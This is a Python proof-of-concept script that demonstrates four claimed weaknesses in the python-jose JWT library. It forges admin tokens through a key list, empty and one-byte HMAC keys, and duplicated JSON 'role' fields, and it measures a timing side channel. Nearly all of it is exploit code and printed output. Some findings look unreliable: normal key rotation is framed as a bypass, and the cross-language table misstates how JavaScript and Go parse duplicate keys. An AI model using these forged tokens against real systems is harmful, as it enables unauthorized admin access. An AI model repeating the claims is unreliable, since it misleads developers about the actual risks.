from jose import jwt
import json
import time
import statistics
import os


def print_separator(title=""):
    print("\n" + "=" * 80)
    if title:
        print(f"  {title}")
        print("=" * 80)
    print()


def exploit_1_key_array_bypass():
    """Key array authentication bypass"""
    print_separator("EXPLOIT 1: KEY ARRAY BYPASS")
    
    SECRET_STRONG = "<TEST_KEY_32_BYTES>"
    SECRET_WEAK = "<LEAKED_KEY_PLACEHOLDER>"
    
    # Test: Single key rejects wrong signature
    token_weak = jwt.encode({"user": "attacker"}, SECRET_WEAK, algorithm="HS256")
    try:
        jwt.decode(token_weak, SECRET_STRONG, algorithms=["HS256"])
        print("✗ FAIL: Single key accepted wrong signature")
    except Exception:
        print("✓ PASS: Single key rejected wrong signature")
    
    # Test: Key array accepts any key in list
    try:
        payload = jwt.decode(token_weak, [SECRET_STRONG, SECRET_WEAK], algorithms=["HS256"])
        print("✓ EXPLOIT: Key array accepted token signed with compromised key")
        print(f"   Payload: {payload}")
    except Exception as e:
        print(f"✗ FAIL: {e}")
    
    # Real-world scenario
    old_key = "<OLD_KEY>"
    new_key = "<NEW_KEY>"
    token = jwt.encode({"user": "attacker@evil.com", "admin": True}, old_key, algorithm="HS256")
    
    try:
        payload = jwt.decode(token, [new_key, old_key], algorithms=["HS256"])
        print("✓ CRITICAL: Authentication bypass successful")
        print(f"   Result: {payload}")
    except Exception as e:
        print(f"✗ FAIL: {e}")


# =============================================================================
# EXPLOIT #2: TIMING SIDE-CHANNEL ATTACK
# =============================================================================

def exploit_2_timing_attack():
    """Timing side-channel attack"""
    print_separator("EXPLOIT #2: TIMING SIDE-CHANNEL")
    
    iterations = 1000
    array_size = 21
    
    keys_first = ["correct_key"] + [f"decoy_{i}" for i in range(array_size - 1)]
    keys_last = [f"decoy_{i}" for i in range(array_size - 1)] + ["correct_key"]
    token = jwt.encode({"test": "timing"}, "correct_key", algorithm="HS256")
    
    # Measure first position
    times_first = []
    for _ in range(iterations):
        start = time.perf_counter()
        jwt.decode(token, keys_first, algorithms=["HS256"])
        times_first.append(time.perf_counter() - start)
    
    # Measure last position
    times_last = []
    for _ in range(iterations):
        start = time.perf_counter()
        jwt.decode(token, keys_last, algorithms=["HS256"])
        times_last.append(time.perf_counter() - start)
    
    mean_first = statistics.mean(times_first) * 1000
    mean_last = statistics.mean(times_last) * 1000
    stdev_first = statistics.stdev(times_first) * 1000
    stdev_last = statistics.stdev(times_last) * 1000
    difference_ms = mean_last - mean_first
    ratio = mean_last / mean_first
    
    print(f"Iterations: {iterations}, Array size: {array_size}")
    print(f"First position: {mean_first:.4f} ms (±{stdev_first:.4f})")
    print(f"Last position:  {mean_last:.4f} ms (±{stdev_last:.4f})")
    print(f"Difference:     {difference_ms:.4f} ms")
    print(f"Ratio:          {ratio:.2f}x")
    
    network_jitter = 0.1
    snr = difference_ms / network_jitter
    print(f"Signal/Noise:   {snr:.2f}:1")
    
    if ratio > 2.0:
        print("✓ EXPLOITABLE: Timing difference detectable over network")
    else:
        print("✗ NOT EXPLOITABLE: Timing difference too small")


# =============================================================================
# EXPLOIT #3: WEAK HMAC KEY ACCEPTANCE
# =============================================================================

def exploit_3_weak_hmac_keys():
    """Weak HMAC key acceptance"""
    print_separator("EXPLOIT #3: WEAK HMAC KEY ACCEPTANCE")
    
    # Test 1: Empty key
    try:
        token = jwt.encode({"user": "admin", "permissions": ["*"]}, "", algorithm="HS256")
        payload = jwt.decode(token, "", algorithms=["HS256"])
        print("✓ CRITICAL: Empty key accepted")
        print(f"   Token: {token[:60]}...")
        print(f"   Payload: {payload}")
    except Exception as e:
        print(f"✗ Empty key rejected: {e}")
    
    # Test 2: Single-byte key
    try:
        token = jwt.encode({"test": "data"}, "a", algorithm="HS256")
        payload = jwt.decode(token, "a", algorithms=["HS256"])
        print("✓ CRITICAL: 1-byte key accepted (brute-forceable)")
    except Exception as e:
        print(f"✗ Single-byte key rejected: {e}")
    
    # Test 3: Misconfiguration scenario
    if 'JWT_SECRET' in os.environ:
        del os.environ['JWT_SECRET']
    
    secret = os.getenv("JWT_SECRET", "")
    if secret == "":
        try:
            token = jwt.encode({"user_id": 1, "username": "admin", "admin": True}, secret, algorithm="HS256")
            payload = jwt.decode(token, secret, algorithms=["HS256"])
            print("✓ CRITICAL: os.getenv(..., '') pattern vulnerable")
            print(f"   Payload: {json.dumps(payload, indent=2)}")
        except Exception as e:
            print(f"✗ Protected: {e}")
    
    # Test 4: RFC 2104 compliance
    print("\nRFC 2104 compliance (HS256 requires ≥32 bytes):")
    test_keys = [
        ("", 0, "Empty"),
        ("a", 1, "1-byte"),
        ("short", 5, "5-byte"),
        ("password123", 11, "11-byte"),
        ("a" * 16, 16, "16-byte"),
        ("a" * 32, 32, "32-byte (min)"),
    ]
    
    print(f"  {'Length':<12} {'Bytes':<6} {'Accepted':<10} {'RFC OK'}")
    print("  " + "-" * 40)
    for key, length, desc in test_keys:
        try:
            jwt.encode({"test": "data"}, key, algorithm="HS256")
            accepted = "YES"
            compliant = "YES" if length >= 32 else "NO"
        except:
            accepted = "NO"
            compliant = "N/A"
        print(f"  {desc:<12} {length:<6} {accepted:<10} {compliant}")


# =============================================================================
# EXPLOIT #4: JSON DUPLICATE KEY CONFUSION
# =============================================================================

def exploit_4_json_duplicate_keys():
    """JSON duplicate key confusion"""
    print_separator("EXPLOIT #4: JSON DUPLICATE KEY CONFUSION")
    
    # Test 1: Python behavior
    dup_json = '{"user":"guest","role":"user","role":"admin"}'
    parsed = json.loads(dup_json)
    print(f"Input:  {dup_json}")
    print(f"Result: {parsed}")
    print(f"Python: last-wins (role='{parsed['role']}')")
    
    # Test 2: JWT integration
    try:
        token = jwt.encode(parsed, "secret123", algorithm="HS256")
        decoded = jwt.decode(token, "secret123", algorithms=["HS256"])
        print(f"✓ JWT created with ambiguous payload")
        print(f"   Decoded: {decoded}")
    except Exception as e:
        print(f"✗ Failed: {e}")
    
    # Test 3: Cross-language comparison
    print("\nCross-language behavior:")
    behaviors = [
        ("Python", "last-wins", "admin"),
        ("JavaScript", "first-wins", "user"),
        ("Go", "error", "N/A"),
        ("Java", "last-wins", "admin"),
    ]
    
    print(f"  {'Language':<12} {'Behavior':<12} {'Result'}")
    print("  " + "-" * 35)
    for lang, behavior, result in behaviors:
        print(f"  {lang:<12} {behavior:<12} {result}")
    
    # Test 4: Attack scenario
    print("\nAttack scenario (JS frontend + Python backend):")
    attack_payload = '{"user":"attacker","role":"user","role":"admin"}'
    parsed_attack = json.loads(attack_payload)
    print(f"Payload: {attack_payload}")
    print(f"Frontend (JS): sees role='user' → logs as 'user'")
    print(f"Backend (Py):  sees role='{parsed_attack['role']}' → grants admin")
    print("✓ EXPLOIT: Privilege escalation + inconsistent audit trail")
    
    # Test 5: Multiple duplicates
    complex_json = '{"user":"guest","user":"member","user":"admin","level":1,"level":99}'
    complex_parsed = json.loads(complex_json)
    print(f"\nMultiple duplicates:")
    print(f"Input:  {complex_json}")
    print(f"Result: {complex_parsed}")
    print("✓ No validation - duplicates silently accepted")


# =============================================================================
# MAIN EXECUTION
# =============================================================================

def main():
    """Run all exploit demonstrations"""
    print("=" * 80)
    print("  PYTHON-JOSE SECURITY ISSUES - PROOF OF CONCEPT")
    print("=" * 80)
    print()
    print("Target: python-jose v3.3.0 - v3.5.0")
    print("Date: October 25, 2025")
    print()
    print("Issues:")
    print("  1. Key Array Authentication Bypass")
    print("  2. Timing Side-Channel Attack")
    print("  3. Weak HMAC Key Acceptance")
    print("  4. JSON Duplicate Key Confusion")
    print()
    input("Press Enter to start...")
    
    try:
        exploit_1_key_array_bypass()
        input("\nPress Enter to continue...")
        
        exploit_2_timing_attack()
        input("\nPress Enter to continue...")
        
        exploit_3_weak_hmac_keys()
        input("\nPress Enter to continue...")
        
        exploit_4_json_duplicate_keys()
        
        print_separator("SUMMARY")
        print("All four issues demonstrated:")
        print()
        print("✓ Issue #1: Key array authentication bypass")
        print("✓ Issue #2: Timing side-channel leak")
        print("✓ Issue #3: Weak HMAC key acceptance")
        print("✓ Issue #4: JSON duplicate key confusion")
        print()
        print("=" * 80)
        
    except KeyboardInterrupt:
        print("\n\nInterrupted by user")
    except Exception as e:
        print(f"\n\nError: {e}")
        import traceback
        traceback.print_exc()


if __name__ == "__main__":
    main()

